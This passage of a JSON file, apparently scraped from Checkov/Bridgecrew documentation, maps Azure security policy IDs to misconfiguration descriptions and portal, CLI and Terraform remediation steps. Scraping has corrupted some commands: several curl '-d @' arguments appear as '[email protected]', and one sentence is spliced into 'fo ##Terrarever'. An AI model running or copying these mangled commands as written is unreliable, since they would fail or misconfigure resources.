<resourceGroupName> \n--bypass AzureServices\n\nFix - Buildtime \nTerraform\n\nResources:\nazurerm_storage_account\nazurerm_storage_account_network_rules\nArgument: bypass\n\nGoresource \"azurerm_storage_account\" \"example\" {\n    ...\n+   bypass                     = [\"AzureServices\"]\n    }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_12": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_logging_1",
        "description": "Azure Network Watcher NSG flow logs retention is less than 90 days\nDescription\nFlow logs enable capturing information about IP traffic flowing in and out of network security groups. Logs can be used to check for anomalies and give insight into suspected breaches.\nWe recommend your Network Security Group (NSG) Flow Log Retention Period is set to greater than or equal to 90 days.\nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to Network Watcher >  Logs section.\nSelect the NSG flow logs blade. \nFor each Network Security Group in the list:\na) Set Status to On.\nb) Set Retention (days) to greater than 90 days.\nc) In Storage account select your storage account.\nd) Click Save.\n\nCLI Command\nTo enable the NSG flow logs and set the Retention (days)  to greater than or equal to 90 days, use the following command:\naz network watcher flow-log configure \n--nsg <NameorID of the Network Security Group> \n--enabled true \n--resource-group <resourceGroupName> \n--retention 91 \n--storage-account <NameorID of the storage account to save flow logs>\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_network_watcher_flow_log\nArgument: days\n\nGoresource \"azurerm_network_watcher_flow_log\" \"test\" {\n    ...\n+   retention_policy {\n+   enabled = true\n+   days    = <90 or greater>\n    }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_24": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_logging_3",
        "description": "Azure SQL server audit log retention is less than 91 days\nDescription\nAudit Logs can be used to check for anomalies and give insight into suspected breaches or misuse of information and access.\nWe recommend you configure SQL server audit retention to be greater than 90 days.\nFix - Runtime\nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\n2 Navigate to SQL servers.\nFor each server instance:\na) Click Auditing.\nb) Select Storage Details.\nc) Set Retention (days) to greater than 90 days.\nd) Click OK.\ne) Click Save.\n\nCLI Command\nTo set the retention policy for more than or equal to 90 days, for each server, use the following command:\nset-AzureRmSqlServerAuditing \n-ResourceGroupName <resource group name> \n-ServerName <server name> \n-RetentionInDays <Number of Days to retain the audit logs, should be 90days minimum>\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_sql_server, azurerm_mssql_server\nArgument: retention_in_days* \n\nGoresource \"azurerm_sql_server\" \"example\" {\n    ...\n    extended_auditing_policy {\n      storage_endpoint            = azurerm_storage_account.example.primary_blob_endpoint\n      storage_account_access_key  = azurerm_storage_account.example.primary_access_key\n      storage_account_access_key_is_secondary = true\n +       retention_in_days                       = <90 or greater>\n    }\n}\n",
        "severity": "HIGH"
    },
    "CKV_AZURE_33": {
        "url": "https://docs.bridgecrew.io/docs/enable-requests-on-storage-logging-for-queue-service",
        "description": "Storage logging for queue service does not have read, write, and delete requests enabled\nDescription\nThe Azure Queue Storage service stores messages that may be read by any client with access to the storage account. A queue may contain an unlimited number of messages, each of which can be up to 64KB in size when using version 2011-08-18 or newer. \nStorage Logging takes place server-side recording details in the storage account for both successful and failed requests. These logs allow users to see the details of read, write, and delete operations against the queues. Storage Logging log entries contain the following information about individual requests: timing information, for example start time, end-to-end latency, server latency, authentication details, concurrency information, and the size of request and response messages.\nStorage Analytics logs contain detailed information about successful and failed requests to a storage service. This information can be used to monitor individual requests and to diagnose issues with a storage service. Requests are logged on a best-effort basis. Storage Analytics logging is not enabled by default for your storage account.\nFix - Runtime\nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to Storage Accounts.\nSelect the specific Storage Account.\nFrom the Monitoring (classic) section, select the Diagnostics logs (classic) blade.\nSet the Status to On.\nSelect Queue properties.\nNavigate to the Logging section to enable Storage Logging for Queue service.\nSelect Read, Write and Delete options.\n\nCLI Command\nTo enable the Storage Logging for Queue service, use the following command:\nstorage logging update--account-name <storageAccountName> \n--account-key <storageAccountKey> \n--services q \n--log rwd \n--retention 90\n\nFix - Buildtime\nTerraform\n\nResource: azurerm_storage_account\nArgument: logging + hour_metrics + minute_metrics\n\nGoresource \"azurerm_storage_account\" \"example\" {\n    name                     = \"example\"\n    resource_group_name      = data.azurerm_resource_group.example.name\n    location                 = data.azurerm_resource_group.example.location\n    account_tier             = \"Standard\"\n    account_replication_type = \"GRS\"\n    queue_properties  {\n+   logging {\n        delete                = true\n        read                  = true\n        write                 = true\n        version               = \"1.0\"\n        retention_policy_days = 10\n    }\n  }\n}\n\nThe logging field should be enough to enable logging. As Terraform apply might fail, it is recommended to also configure the hour_metrics and minute_metrics fields.\nTo do this, insert the following code in the queue_properties section of the code above.\nGo+   hour_metrics {\n        enabled               = true\n        include_apis          = true\n        version               = \"1.0\"\n        retention_policy_days = 10\n    }\n+   minute_metrics {\n        enabled               = true\n        include_apis          = true\n        version               = \"1.0\"\n        retention_policy_days = 10\n    }\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_37": {
        "url": "https://docs.bridgecrew.io/docs/set-activity-log-retention-to-365-days-or-greater",
        "description": "Activity log retention is set to less than 365 days \nDescription\nA log profile controls how the activity log is exported and retained. Since the average time to detect a breach is 210 days, the activity log should be retained for 365 days or more, providing time to respond to any incidents.\nWe recommend you set activity log retention for 365 days or greater.\nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to the Activity log.\nSelect Export.\nSet Retention (days) to 365 or 0.\nClick Save.\n\nCLI Command\nTo set Activity log Retention (days) to 365 or greater, use the following command:\naz monitor log-profiles update \n--name <logProfileName> \n--set retentionPolicy.days=<number of days> retentionPolicy.enabled=true\n\nTo store logs for fo\n##Terrarever (indefinitely), use the following command:\naz monitor log-profiles update \n--name <logProfileName> \n--set retentionPolicy.days=0 retentionPolicy.enabled=false\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_monitor_log_profile\nArgument: retention policy\n\nOption 1\nGoresource \"azurerm_monitor_log_profile\" \"example\" {\n    name = \"default\"\n    categories = [\n    \"Action\",\n    \"Delete\",\n    \"Write\",\n    ]\n    locations = [\n    \"westus\",\n    \"global\",\n    ]\n+    retention_policy {\n+    enabled = true\n+    days    = 365\n    }\n}\n\nOption 2\nGoresource \"azurerm_monitor_log_profile\" \"example\" {\n    name = \"default\"\n    categories = [\n    \"Action\",\n    \"Delete\",\n    \"Write\",\n    ]\n    locations = [\n    \"westus\",\n    \"global\",\n    ]\n+    retention_policy {\n+    enabled = false\n+    days    = 0\n    }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_38": {
        "url": "https://docs.bridgecrew.io/docs/ensure-audit-profile-captures-all-activities",
        "description": "Log profile is not configured to capture all activities\nDescription\nA log profile controls how the activity log is exported. Configuring the log profile to collect logs for the categories Write, Delete and Action ensures that all control/management plane activities performed on the subscription are exported.\nWe recommend you configure the log profile to export all activities from the control/management plane.\nFix - Runtime \nAzure Portal\nThe Azure portal currently has no provision to check or set categories.\nCLI Command\nTo update an existing default log profile, use the following command:\naz monitor log-profiles update --name default\nFix - Buildtime \nTerraform\n\nResource: azurerm_monitor_log_profile\nArgument: categories\n\nGoresource \"azurerm_monitor_log_profile\" \"example\" {\n    ...\n    categories = [\n +   \"Action\",\n +   \"Delete\",\n +   \"Write\",\n    ]\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_2": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_general_1",
        "description": "Azure VM data disk is encrypted with the default encryption key instead of ADE/CMK\nDescription\nAzure encrypts data disks by default Server-Side Encryption (SSE) with platform-managed keys [SSE with PMK]. It is recommended to use either SSE with Azure Disk Encryption [SSE with PMK+ADE] or Customer Managed Key [SSE with CMK] which improves on platform-managed keys by giving you control of the encryption keys to meet your compliance need.  Encryption does not impact the performance of managed disks and there is no additional cost for the encryption.\nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nSelect the Management tab and verify that you have a Diagnostics Storage Account. If you have no storage accounts, select Create New, give your new account a name, then select OK.\nWhen the VM deployment is complete, select Go to resource.\nOn the left-hand sidebar, select Disks. On the Disks screen, select Encryption.\nOn the Create key vault screen, ensure that the Resource Group is the same as the one you used to create the VM.\nName your key vault.\nOn the Access Policies tab, check the Azure Disk Encryption for volume encryption. \nAfter the key vault has passed validation, select Create. Leave the Key field blank, then click Select.\nAt the top of the Encryption screen, click Save. A popup will warn you that the VM will reboot. Click Yes.\n\nCLI Command\nEncrypt your VM with az vm encryption, providing your unique Key Vault name to the --disk-encryption-keyvault parameter.\nShellaz vm encryption enable -g MyResourceGroup --name MyVM --disk-encryption-keyvault myKV\n\n## You can verify that encryption is enabled on your VM with az vm show\naz vm show --name MyVM -g MyResourceGroup\n\n## You will see the following in the returned output:\n\"EncryptionOperation\": \"EnableEncryption\"\n\nFix - Buildtime\nTerraform\n\nResource: azurerm_managed_disk\nArgument: encryption_settings - Is Encryption enabled on this Managed Disk? Changing this forces a new resource to be created.\nAdd the encryption_settings block as show:\n\nazurerm_managed_disk.example.tfresource \"azurerm_managed_disk\" \"example\" {\n  name                 = var.disk_name\n  location             = var.location\n  resource_group_name  = var.resource_group_name\n  storage_account_type = var.storage_account_type\n  create_option        = \"Empty\"\n  disk_size_gb         = var.disk_size_gb\n + encryption_settings {\n +   enabled = true\n + }\n  tags = var.common_tags\n}\n\nARM Templates\n\nResource: encryptionOperation\nArgument: EnableEncryption\n\nGo{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"parameters\": {\n    \"vmName\": {\n      \"type\": \"string\",\n      \"metadata\": {\n        \"description\": \"Name of the virtual machine\"\n      }\n    },\n    \"volumeType\": {\n      \"type\": \"string\",\n      \"defaultValue\": \"Data\",\n      \"allowedValues\": [\n        \"Data\"\n      ],\n      \"metadata\": {\n        \"description\": \"Decryption is supported only on data drives for Linux VMs.\"\n      }\n    },\n    \"sequenceVersion\": {\n      \"type\": \"string\",\n      \"defaultValue\": \"1.0\",\n      \"metadata\": {\n        \"description\": \"Pass in an unique value like a GUID everytime the operation needs to be force run\"\n      }\n    },\n    \"location\": {\n      \"type\": \"string\",\n      \"defaultValue\": \"[resourceGroup().location]\",\n      \"metadata\": {\n        \"description\": \"Location for all resources.\"\n      }\n    }\n  },\n  \"variables\": {\n    \"extensionName\": \"AzureDiskEncryptionForLinux\",\n    \"extensionVersion\": \"0.1\",\n+   \"encryptionOperation\": \"EnableEncryption\",\n  \n  ...\n",
        "severity": "HIGH"
    },
    "CKV_AZURE_13": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_general_2",
        "description": "Azure App Service Web app authentication is Off\nDescription\nAzure App Service Authentication is a feature that prevents anonymous HTTP requests from reaching the API app. Users with tokens are authenticated before they reach the API app. If an anonymous request is received from a browser, App Service redirects to a logon page. To handle the logon process select from a set of identity providers, or implement a custom authentication mechanism.\nEnabling App Service Authentication allows every incoming HTTP request to pass through it before being handled by the application code. Authentication of users with specified providers are handled, for example, Azure Active Directory, Facebook, Google, Microsoft Account, and Twitter. It also handles authentication of validation, storing and refreshing of tokens, managing the authenticated sessions, and injecting identity information into request headers.\nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to App Services.\nClick each App.\nNavigate to the Setting section, click Authentication / Authorization.\nSet App Service Authentication to On.\nSelect additional parameters as per your requirements. \nClick Save.\n\nCLI Command\nTo set App Service Authentication for an existing app, use the following command:\naz webapp auth update \n--resource-group <RESOURCE_GROUP_NAME> \n--name <APP_NAME> \n--enabled true\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument: auth_settings:enabled\n\nGoresource \"azurerm_app_service\" \"example\" {\n        ...\n+   auth_settings {\n+       enabled          = true\n    ...\n    }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_20": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_general_3",
        "description": "No security contact phone number is present\nDescription\nMicrosoft reaches out to the designated security contact in case its security team finds that the organization's resources are compromised. This ensures that the correct people are aware of any potential compromise and can mitigate the risk in a timely fashion.\nWe recommend you provide a security contact phone number, but before taking any action make sure that the information provided is valid because the communication is not digitally signed.\nFix - Runtime\nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to the Security Center.\nClick Security Policy.\nFor the security policy subscription, click Edit Settings. \nClick Email notifications.\nEnter a valid security contact Phone Number.\nClick Save.\n\nCLI Command\nTo set a phone number for contact at time of a potential security breach, use the following command:\naz account get-access-token \n--query \"{subscription:subscription,accessToken:accessToken}\" \n--out tsv | xargs -L1 bash -c 'curl -X PUT -H \"Authorization: Bearer $1\" \n-H \"Content-Type:application/json\"\nhttps://management.azure.com/subscriptions/$0/providers/Microsoft.Security/\nsecurityContacts/default1?api-version=2017-08-01-preview [email\u00a0protected]\"*input.json*\"'\n\nWhere input.json contains the Request body json data, detailed below.\nReplace validEmailAddress with email ids csv for multiple.\nReplace phoneNumber with the valid phone number.\nGo{   \n\"id\":\n\"/subscriptions/<Your_Subscription_Id>/providers/Microsoft.Security/\nsecurityContacts/default1\",\n\"name\": \"default1\",\n\"type\": \"Microsoft.Security/securityContacts\",\n\"properties\": {\n\"email\": \"<validEmailAddress>\",\n\"phone\": \"<phone_number>\",\n\"alertNotifications\": \"On\",\n\"alertsToAdmins\": \"On\"\n}\n}\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_security_center_contact\nArgument: phone\n\nGoresource \"azurerm_security_center_contact\" \"example\" {\n    email = \"[email\u00a0protected]\"\n    phone = \"+1-555-555-5555\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_21": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_general_4",
        "description": "Send email notification for high severity alerts is not enabled\nDescription\nEnabling email security alerts to be automatically sent to your organization's security staff ensures that the correct people are aware of any potential security issues, and can mitigate the risk.\nSetting the security alert Send email notification for high severity alerts to On ensures that emails are sent from Microsoft if their security team determines a potential security breach has taken place. \nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to the Security Center.\nClick Security Policy.\nFor the security policy subscription, click Edit Settings. \nClick Email notifications.\nSet Send email notification for high severity alerts to On.\nClick Save.\n\nCLI Command\nTo set Send email notification for high severity alerts to On, use the following command:\naz account get-access-token --query\n\"{subscription:subscription,accessToken:accessToken}\" --out tsv | xargs -L1\nbash -c 'curl -X PUT -H \"Authorization: Bearer $1\" -H \"Content-Type:application/json\"\nhttps://management.azure.com/subscriptions/$0/providers/Microsoft.Security/\nsecurityContacts/default1?api-version=2017-08-01-preview [email\u00a0protected]\"input.json\"'\n\nWhere input.json contains the Request body json data, detailed below.\nReplace validEmailAddress with email ids csv for multiple.\nReplace phoneNumber with the valid phone number.\n{\n\"id\":\n\"/subscriptions/<Your_Subscription_Id>/providers/Microsoft.Security/\nsecurityContacts/default1\",\n\"name\": \"default1\",\n\"type\": \"Microsoft.Security/securityContacts\",\n\"properties\": {\n\"email\": \"<validEmailAddress>\",\n\"phone\": \"<phone_number>\",\n\"alertNotifications\": \"On\",\n\"alertsToAdmins\": \"On\"\n}\n}\n\nFix - Buildtime\nTerraform\n\nResource: azurerm_security_center_contact\nArgument: alert_notifications\n\nGoresource \"azurerm_security_center_contact\" \"example\" {\n    ...\n+   alert_notifications = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_22": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_general_5",
        "description": "Send email notification for high severity alerts to admins is not enabled\nDescription\nEnabling security alert emails to subscription owners ensures that they receive security alert emails from Microsoft. This ensures that they are aware of any potential security issues and can mitigate the risk identified in a timely fashion.\nWe recommend set security alert emails to be sent to subscription owners.\nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to the Security Center.\nClick Security Policy.\nNavigate to Security Policy Subscription, click Edit Settings. \nClick Email notifications.\nSet Send email also to subscription owners to On.\nClick Save.\n\nCLI Command\nTo set Send email also to subscription owners to On, use the following command:\naz account get-access-token --query\n\"{subscription:subscription,accessToken:accessToken}\" --out tsv | xargs -L1\nbash -c 'curl -X PUT -H \"Authorization: Bearer $1\" -H \"Content-Type:\napplication/json\"\nhttps://management.azure.com/subscriptions/$0/providers/Microsoft.Security/se\ncurityContacts/default1?api-version=2017-08-01-preview [email\u00a0protected]\"input.json\"'\n\nWhere input.json contains the Request body json data, detailed below.\nReplace validEmailAddress with email ids csv for multiple.\nReplace phoneNumber with a valid phone number.\n {\n \"id\":\n\"/subscriptions/<Your_Subscription_Id>/providers/Microsoft.Security/securityC\nontacts/default1\",\n \"name\": \"default1\",\n \"type\": \"Microsoft.Security/securityContacts\",\n \"properties\": {\n \"email\": \"<validEmailAddress>\",\n \"phone\": \"<phone_number>\",\n \"alertNotifications\": \"On\",\n \"alertsToAdmins\": \"On\"\n }\n }\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_security_center_contact\nArgument: alerts_to_admins\n\nGoresource \"azurerm_security_center_contact\" \"example\" {\n    ...\n+   alerts_to_admins    = true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_25": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_general_6",
        "description": "Azure SQL Server threat detection alerts are not enabled for all threat types\nDescription\nEnabling all Threat Detection Types protects against SQL injection, database vulnerabilities, and any other anomalous activities. We recommend you enable all types of threat detection on SQL servers.\nFix - Runtime\nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to SQL servers.\nFor each server instance:\na) Click Advanced Data Security.\nb) Navigate to Threat Detection Settings section.\nc) Set Threat Detection Types to All.\n\nCLI Command\nTo set each server's ExcludedDetectionTypes to None, use the following command:\nSet-AzureRmSqlServerThreatDetectionPolicy \n-ResourceGroupName <resource group name> \n-ServerName <server name> \n-ExcludedDetectionType \"None\"\n\nFix - Buildtime \nARM\n\nResource: Microsoft.Sql/servers/databases\n\nJSON{\n    \"type\": \"Microsoft.Sql/servers/databases\",\n    \"apiVersion\": \"2020-08-01-preview\",\n    \"name\": \"[variables('dbName')]\",\n    \"location\": \"[parameters('location')]\",\n    \"sku\": {\n        \"name\": \"[parameters('sku')]\"\n    },\n    \"kind\": \"v12.0,user\",\n    \"properties\": {\n        \"collation\": \"SQL_Latin1_General_CP1_CI_AS\",\n        \"maxSizeBytes\": \"[mul(parameters('maxSizeMB'), 1048576)]\",\n        \"catalogCollation\": \"SQL_Latin1_General_CP1_CI_AS\",\n        \"zoneRedundant\": false,\n        \"readScale\": \"Disabled\",\n        \"storageAccountType\": \"GRS\"\n    },\n    \"resources\": [\n        {\n            \"type\": \"Microsoft.Sql/servers/databases/securityAlertPolicies\",\n            \"apiVersion\": \"2014-04-01\",\n            \"name\": \"[concat(variables('dbName'), '/current')]\",\n            \"location\": \"[parameters('location')]\",\n            \"dependsOn\": [\n                \"[resourceId('Microsoft.Sql/servers/databases', parameters('serverName'), parameters('databaseName'))]\"\n            ],\n            \"properties\": {\n+               \"state\": \"Enabled\",\n+               \"disabledAlerts\": \"\",\n                \"emailAddresses\": \"[variables('emailAddresses')[copyIndex()]]\",\n                \"emailAccountAdmins\": \"Enabled\"\n            }\n        }\n    ]\n}\n\nTerraform\n\nResource: azurerm_mssql_server_security_alert_policy\nArgument: disabled_alerts\n\nGoresource \"azurerm_mssql_server_security_alert_policy\" \"example\" {\n    ...\n+   disabled_alerts = []\n    }\n",
        "severity": "HIGH"
    },
    "CKV_AZURE_26": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_general_7",
        "description": "Azure SQL server send alerts to field value is not set\nDescription\nProvide the email address where alerts will be sent when anomalous activities are detected on SQL servers. Providing the email address to receive alerts ensures that any detection of anomalous activities is reported as soon as possible, enabling early mitigation of any potential risk detected.\nWe recommend you add an email address to the Send Alerts to field value for MSSQL servers. \nFix - Runtime\nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to SQL servers.\nFor each server instance:\na) Click Advanced Threat Protection.\nb) In Send alerts to enter email addresses as appropriate. \n\nCLI Command\nTo set each server's Send alerts to, use the following command:\nSet-AzureRmSqlServerThreatDetectionPolicy \n-ResourceGroupName <resource group name> \n-ServerName <server name> \n-NotificationRecipientsEmails \"<Recipient Email ID>\"\n\nFix - Buildtime\nFix - Buildtime \nARM\n\nResource: Microsoft.Sql/servers/databases\n\nJSON{\n    \"type\": \"Microsoft.Sql/servers/databases\",\n    \"apiVersion\": \"2020-08-01-preview\",\n    \"name\": \"[variables('dbName')]\",\n    \"location\": \"[parameters('location')]\",\n    \"sku\": {\n        \"name\": \"[parameters('sku')]\"\n    },\n    \"kind\": \"v12.0,user\",\n    \"properties\": {\n        \"collation\": \"SQL_Latin1_General_CP1_CI_AS\",\n        \"maxSizeBytes\": \"[mul(parameters('maxSizeMB'), 1048576)]\",\n        \"catalogCollation\": \"SQL_Latin1_General_CP1_CI_AS\",\n        \"zoneRedundant\": false,\n        \"readScale\": \"Disabled\",\n        \"storageAccountType\": \"GRS\"\n    },\n    \"resources\": [\n        {\n            \"type\": \"Microsoft.Sql/servers/databases/securityAlertPolicies\",\n            \"apiVersion\": \"2014-04-01\",\n            \"name\": \"[concat(variables('dbName'), '/current')]\",\n            \"location\": \"[parameters('location')]\",\n            \"dependsOn\": [\n                \"[resourceId('Microsoft.Sql/servers/databases', parameters('serverName'), parameters('databaseName'))]\"\n            ],\n            \"properties\": {\n                \"state\": \"Enabled\",\n                \"disabledAlerts\": \"\",\n+               \"emailAddresses\": \"[variables('emailAddresses')[copyIndex()]]\",\n                \"emailAccountAdmins\": \"Enabled\"\n            }\n        }\n    ]\n}\n\nTerraform\n\nResource: azurerm_mssql_server_security_alert_policy\nArgument: email_addresses\n\nGoresource \"azurerm_mssql_server_security_alert_policy\" \"example\" {\n    ...\n+   email_addresses = [\"[email\u00a0protected]\"]\n}\n",
        "severity": "HIGH"
    },
    "CKV_AZURE_27": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_general_8",
        "description": "MSSQL servers do not have email service and co-administrators enabled\nDescription\nEnable Service and Co-administrators to receive security alerts from the SQL server. Providing the email address to receive alerts ensures that any detection of anomalous activities is reported as soon as possible, enabling early mitigation of any potential risk detected.\nFix - Runtime\nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to SQL servers.\nFor each server instance:\na) Click Advanced Data Security.\nb) Navigate to Threat Detection Settings section.\nc) Enable Email service and co-administrators.\n\nCLI Command\nTo enable each server's Email service and co-administrators for MSSQL, use the following command:\nSet-AzureRmSqlServerThreatDetectionPolicy\n-ResourceGroupName <resource group name> \n-ServerName <server name> \n-EmailAdmins $True\n\nFix - Buildtime\nARM\n\nResource: Microsoft.Sql/servers/databases\n\nJSON{\n    \"type\": \"Microsoft.Sql/servers/databases\",\n    \"apiVersion\": \"2020-08-01-preview\",\n    \"name\": \"[variables('dbName')]\",\n    \"location\": \"[parameters('location')]\",\n    \"sku\": {\n        \"name\": \"[parameters('sku')]\"\n    },\n    \"kind\": \"v12.0,user\",\n    \"properties\": {\n        \"collation\": \"SQL_Latin1_General_CP1_CI_AS\",\n        \"maxSizeBytes\": \"[mul(parameters('maxSizeMB'), 1048576)]\",\n        \"catalogCollation\": \"SQL_Latin1_General_CP1_CI_AS\",\n        \"zoneRedundant\": false,\n        \"readScale\": \"Disabled\",\n        \"storageAccountType\": \"GRS\"\n    },\n    \"resources\": [\n        {\n            \"type\": \"Microsoft.Sql/servers/databases/securityAlertPolicies\",\n            \"apiVersion\": \"2014-04-01\",\n            \"name\": \"[concat(variables('dbName'), '/current')]\",\n            \"location\": \"[parameters('location')]\",\n            \"dependsOn\": [\n                \"[resourceId('Microsoft.Sql/servers/databases', parameters('serverName'), parameters('databaseName'))]\"\n            ],\n            \"properties\": {\n                \"state\": \"Enabled\",\n                \"disabledAlerts\": \"\",\n                \"emailAddresses\": \"[variables('emailAddresses')[copyIndex()]]\",\n+               \"emailAccountAdmins\": \"Enabled\"\n            }\n        }\n    ]\n}\n\nTerraform\n\nResource: azurerm_mssql_server_security_alert_policy\nArgument: email_account_admins\n\nGoresource \"azurerm_mssql_server_security_alert_policy\" \"example\" {\n    ...\n+   email_account_admins       = true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_19": {
        "url": "https://docs.bridgecrew.io/docs/ensure-standard-pricing-tier-is-selected",
        "description": "Standard pricing tier is not selected\nDescription\nThe standard pricing tier enables threat detection for networks and virtual machines and allows greater defense-in-depth. It provides threat intelligence, anomaly detection, and behavior analytics in the Azure Security Center. Threat detection is provided by the Microsoft Security Response Center (MSRC).\nFix - Runtime\nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to the Azure Security Center.\nSelect Security policy blade.\nTo alter the the security policy for a subscription, click Edit Settings. \nSelect Pricing tier blade.\nSelect Standard.\nSelect Save.\n\nCLI Command\nTo set the Pricing Tier to Standard, use the following command:\nShellaz account get-access-token\n--query\n\"{subscription:subscription,accessToken:accessToken}\"\n--out tsv | xargs -L1 bash -c 'curl -X PUT -H \"Authorization: Bearer $1\" -H \"Content-Type:\napplication/json\"\nhttps://management.azure.com/subscriptions/$0/providers/Microsoft.Security/pr\nicings/default?api-version=2017-08-01-preview [email\u00a0protected]\"input.json\"'\n\nWhere input.json contains the Request body json data, detailed below.\nShell{\n \"id\":\n\"/subscriptions/<Your_Subscription_Id>/providers/Microsoft.Security/pricings/\ndefault\",\n \"name\": \"default\",\n \"type\": \"Microsoft.Security/pricings\",\n \"properties\": {\n \"pricingTier\": \"Standard\"\n }\n}\n\nFix - Buildtime\nTerraform\n\nResource: azurerm_security_center_subscription_pricing\nArgument: tier\n\nGoresource \"azurerm_security_center_subscription_pricing\" \"example\" {\n -   tier = \"Free\"\n +   tier = \"Standard\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_40": {
        "url": "https://docs.bridgecrew.io/docs/set-an-expiration-date-on-all-keys",
        "description": "Not all keys have an expiration date \nDescription\nThe Azure Key Vault enables users to store and use cryptographic keys within the Microsoft Azure environment. The exp (expiration time) attribute identifies the expiration time on or after which the key must not be used for a cryptographic operation. Keys are not set to expire by default. \nWe recommend you rotate keys in the key vault and set an explicit expiration time for all keys in the Azure Key Vault. This ensures that the keys cannot be used beyond their assigned lifetimes.\nFix - Runtime\nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to Key vaults.\nFor each Key vault:\na) Click Keys.\nb) Navigate to the Settings section.\nc) Set Enabled? to Yes.\nd) Set an appropriate EXPIRATION DATE on all keys.\n\nCLI Command\nTo update the EXPIRATION DATE for the key, use the following command:\naz keyvault key set-attributes \n--name <keyName> \n--vault-name <vaultName> \n--expires Y-m-d'T'H:M:S'Z'\n\nFix - Buildtime\nTerraform\n\nResource: azurerm_key_vault_key\nArgument: expiration_date\n\nGoresource \"azurerm_key_vault_key\" \"generated\" {\n    ...\n+   expiration_date = \"2020-12-30T20:00:00Z\"\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_AZURE_42": {
        "url": "https://docs.bridgecrew.io/docs/ensure-the-key-vault-is-recoverable",
        "description": "Azure key vault is not recoverable\nDescription\nThe key vault contains object keys, secrets and certificates. Accidental unavailability of a key vault can cause immediate data loss or loss of security functions supported by the key vault objects, such as authentication, validation, verification, and non-repudiation. Deleting or purging a key vault leads to immediate data loss as keys encrypting data, including storage accounts, SQL databases, and/or dependent services provided by key vault objects, such as keys, secrets, and certificates.\nWe recommended you make the key vault recoverable by enabling the Do Not Purge and Soft Delete functions. This will prevent accidental deletion by a user running the delete/purge command on the key vault, or an attacker/malicious user does to deliberately to cause disruption. \nFix - Runtime\nProcedure\nThere are two key vault properties that play roles in the permanent unavailability of a key vault.\n\n\nEnablePurgeProtection:\nenableSoftDelete only ensures that the key vault is not deleted permanently and is recoverable for 90 days from the date of deletion. There are scenarios where the key vault and/or its objects are accidentally purged will not be recoverable.\nSetting enablePurgeProtection to \"true\" ensures the key vault and its objects cannot be purged. Enabling both the parameters on key vaults ensures that key vaults and their objects cannot be deleted/purged permanently.\n\n\nSetSoftDeleteRetentionDays (Optional):\nSet the number of days that items should be retained for once soft-deleted. This value can be between 7 and 90 (the default) days.\n\n\nAzure Portal\nThe Azure Portal does not currently have provision to update the respective configurations.\nCLI Command\nUse the following command:\naz resource update \n--id /subscriptions/xxxxxx-xxxx-xxxx-xxxxxxxxxxxxxxxx/resourceGroups/\n<resourceGroupName>/providers/Microsoft.KeyVault/vaults/<keyVaultName> \n--set properties.enablePurgeProtection=true properties.enableSoftDelete=true\n\nFix - Buildtime\nTerraform\n\nResource: azurerm_key_vault\nArgument: soft_delete_enabled + purge_protection_enabled\n\nGoresource \"azurerm_key_vault\" \"example\" {\n        ...\n+   purge_protection_enabled    = true\n+   soft_delete_retention_days  = 7     # Default is 90\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_16": {
